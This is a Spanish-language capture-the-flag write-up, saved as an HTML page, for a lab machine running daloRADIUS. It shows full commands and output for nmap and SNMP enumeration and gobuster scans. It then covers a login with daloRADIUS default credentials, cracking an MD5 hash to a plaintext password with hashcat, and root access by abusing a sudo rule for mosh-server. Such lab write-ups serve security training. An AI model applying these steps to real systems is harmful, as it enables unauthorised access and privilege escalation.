@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./agile.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Agile</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+
+
+
+<h2 id="1-realizamos-escaneo-tcp">1. Realizamos escaneo tcp</h2>
+<p>Y obtenemos la siguiente salida:</p>
+<pre><code class="language-bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="2-realizamos-escaneo-udp">2. Realizamos escaneo udp</h2>
+<p>Y obtenemos la siguiente salida:</p>
+<pre><code class="language-bash">PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: c7ad5c4856d1cf6600000000
+|   snmpEngineBoots: 31
+|_  snmpEngineTime: 5h11m33s
+| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
+|_  System uptime: 5h11m32.92s (1869292 timeticks)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 2 hops
+Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="3-enumeracion-snmp">3. Enumeracion snmp:</h2>
+<p>Como vemos que tiene el servicio snmp expuesto, podemos realizar una enumeración mediante la herramienta <strong>snmpwalk</strong>:</p>
+<pre><code class="language-bash"># snmpwalk -c public -v1 10.10.11.48 .
+</code></pre>
+<p>Y obtenemos la siguiente salida:</p>
+<pre><code class="language-bash">iso.3.6.1.2.1.1.1.0 = STRING: &quot;Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64&quot;
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (1891344) 5:15:13.44
+iso.3.6.1.2.1.1.4.0 = STRING: &quot;steve@underpass.htb&quot;
+iso.3.6.1.2.1.1.5.0 = STRING: &quot;UnDerPass.htb is the only daloradius server in the basin!&quot;
+iso.3.6.1.2.1.1.6.0 = STRING: &quot;Nevada, U.S.A. but not Vegas&quot;
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
+iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: &quot;The SNMP Management Architecture MIB.&quot;
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: &quot;The MIB for Message Processing and Dispatching.&quot;
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: &quot;The management information definitions for the SNMP User-based Security Model.&quot;
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: &quot;The MIB module for SNMPv2 entities&quot;
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: &quot;View-based Access Control Model for SNMP.&quot;
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: &quot;The MIB module for managing TCP implementations&quot;
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: &quot;The MIB module for managing UDP implementations&quot;
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: &quot;The MIB module for managing IP and ICMP implementations&quot;
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: &quot;The MIB modules for managing SNMP Notification, plus filtering.&quot;
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: &quot;The MIB module for logging SNMP Notifications.&quot;
+iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (16) 0:00:00.16
+iso.3.6.1.2.1.25.1.1.0 = Timeticks: (1892636) 5:15:26.36
+iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 02 12 09 10 1C 00 2B 00 00 
+iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
+iso.3.6.1.2.1.25.1.4.0 = STRING: &quot;BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
+&quot;
+iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
+iso.3.6.1.2.1.25.1.6.0 = Gauge32: 216
+iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
+End of MIB
+</code></pre>
+<p>Gracias a dicha salida, podemos ver que se trata de un servicio <strong>daloradius</strong>. Si buscamos en internet, vamos que existen varios endpoins comunes para este servicio, como son <code>/daloradius</code> o `/daloradius/app&#39;. Para descubrir más endpoints lanzamos:</p>
+<pre><code class="language-bash"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://underpass.htb/daloradius/ -t 200
+</code></pre>
+<p>Obteniendo como respuesta:</p>
+<pre><code class="language-bash">/doc                  (Status: 301) [Size: 323] [--&gt; http://underpass.htb/daloradius/doc/]
+/app                  (Status: 301) [Size: 323] [--&gt; http://underpass.htb/daloradius/app/]
+/contrib              (Status: 301) [Size: 327] [--&gt; http://underpass.htb/daloradius/contrib/]
+/ChangeLog            (Status: 200) [Size: 24703]
+/setup                (Status: 301) [Size: 325] [--&gt; http://underpass.htb/daloradius/setup/]
+/library              (Status: 301) [Size: 327] [--&gt; http://underpass.htb/daloradius/library/]
+/LICENSE              (Status: 200) [Size: 18011]
+</code></pre>
+<p>Si profundizamos en la enumeración y miramos el directorio <code>/app</code>:</p>
+<pre><code class="language-bash"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://underpass.htb/daloradius/app/ -t 200
+</code></pre>
+<p>Obtenemos:</p>
+<pre><code>/users                (Status: 301) [Size: 329] [--&gt; http://underpass.htb/daloradius/app/users/]
+/common               (Status: 301) [Size: 330] [--&gt; http://underpass.htb/daloradius/app/common/]
+/operators            (Status: 301) [Size: 333] [--&gt; http://underpass.htb/daloradius/app/operators/]
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="5-acceso-al-panel-de-daloradius">5. Acceso al panel de Daloradius</h2>
+<p>Si nos dirigimos a <code>http://underpass.htb/daloradius/app/operators</code> nos redirige a <code>http://underpass.htb/daloradius/app/operators/login.php</code>. Ahí podemos ver un formulario de login, y si probamos a iniciar sesion con los credenciales por defecto de daloradius, observamos como tenemos acceso: <code>administrator/radius</code>.</p>
+<p>Vemos el siguiente usuario con lo que parece un hash md5:</p>
+<pre><code class="language-bash">svcMosh - 412DD4759978ACFCC81DEAB01B382403
+</code></pre>
+<p>Lanzamos entonces <strong>hashcat</strong> para intentar crackearlo:</p>
+<pre><code class="language-bash"># hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>Obteniendo la siguiente salida:</p>
+<pre><code class="language-bash">Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+412dd4759978acfcc81deab01b382403:underwaterfriends 
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="6-acceso-como-usuario-svcmosh">6. Acceso como usuario svcMosh</h2>
+<p>Accedemos con dicho usuario, y somos capaces de obtener la flag de usuario</p>
+<p>&nbsp;</p>
+<h2 id="7-escalado-de-privilegios">7. Escalado de privilegios</h2>
+<p>Podemos ver si el usuario <strong>svcMosh</strong> tiene la capacidad para ejecutar algun comando como root:</p>
+<pre><code class="language-bash"># sudo -l 
+</code></pre>
+<p>Obteniendo la siguiente respuesta:</p>
+<pre><code class="language-bash">Matching Defaults entries for svcMosh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svcMosh may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/bin/mosh-server
+</code></pre>
+<p>Buscando en internet, vemos que se trata de un servidor parecido a ssh, por lo que si lanzamos una nueva instancia y nos podemos conectar a ella, accederemos como usuario <strong>root</strong>.</p>
+<p>Para ello creamos un nuevo servicio lanzado como sudo:</p>
+<pre><code class="language-bash"># sudo mosh-server new -p 60002
+</code></pre>
+<p>Obteniendo como salida:</p>
+<pre><code class="language-bash">MOSH CONNECT 60002 Et8sx6AN+62bI1nQz0Ohzg
+
+mosh-server (mosh 1.3.2) [build mosh 1.3.2]
+Copyright 2012 Keith Winstein &lt;mosh-devel@mit.edu&gt;
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+[mosh-server detached, pid = 1998]
+</code></pre>
+<p>Nos conectamos entonces a dicho servicio, utilizando la misma clave listada en el comando anterior. Para ello tenemos que establecerla como variable global en nuestro equipo:</p>
+<pre><code class="language-bash"># MOSH_KEY=Et8sx6AN+62bI1nQz0Ohzg mosh-client 10.10.11.48 60002
+</code></pre>
+<p>Vemos entonces como somos capaces de acceder como usuario root, y por lo tanto obtenemos la flag de root.</p>
+        
+        
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
